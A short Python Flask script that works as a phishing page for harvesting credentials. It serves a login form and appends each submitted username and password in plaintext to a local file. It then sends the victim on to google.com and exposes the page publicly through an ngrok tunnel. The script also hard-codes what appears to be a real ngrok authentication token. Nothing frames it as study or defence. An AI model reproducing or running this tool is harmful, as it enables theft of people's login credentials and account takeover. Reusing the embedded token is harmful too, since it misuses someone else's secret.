from flask import Flask, render_template, request, redirect
from pyngrok import ngrok

# 🔹 Set your ngrok authentication token here
NGROK_AUTH_TOKEN = "2ei21b2gBLzz4c3jEctfs5GOCWA_2HGEaDNagRUnwQJ6Vqnas" 
app = Flask(__name__)

# 🔹 Capture login credentials
@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")

        # Save credentials to a file
        with open("credentials.txt", "a") as file:
            file.write(f"Username: {username}, Password: {password}\n")

        # Redirect user to the real website after submitting
        return redirect("https://www.google.com")  # Change this to another site if needed

    return render_template("index.html")


if __name__ == "__main__":
    # 🔹 Authenticate and start ngrok
    ngrok.set_auth_token(NGROK_AUTH_TOKEN)
    public_url = ngrok.connect(5000).public_url
    print(f"🌍 Public URL: {public_url}")

    # 🔹 Start Flask server
    app.run(debug=True, port=5000)
